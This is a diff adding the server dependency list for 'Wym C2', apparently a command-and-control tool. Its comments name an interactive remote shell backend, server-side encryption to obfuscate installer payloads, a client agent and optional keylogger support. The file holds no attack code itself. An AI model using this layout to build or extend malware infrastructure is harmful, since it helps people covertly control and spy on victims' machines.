@@ -1,0 +1,21 @@
+# Wym C2 - server dependencies
+fastapi>=0.110
+uvicorn[standard]>=0.29
+jinja2>=3.1
+python-multipart>=0.0.9
+pydantic>=2.6
+
+# System metrics (dashboard live stats, process listing)
+psutil>=5.9
+
+# Windows pseudo-terminal support for the interactive shell task backend
+pywinpty>=3.0.5; platform_system == "Windows"
+
+# Installer-body obfuscation (AES-256-CBC encryption done server-side)
+pycryptodome>=3.19
+
+# Python client dependency (clients/agent.py)
+requests>=2.31
+
+# Optional: keylogger support for Python agent
+# pynput>=1.7
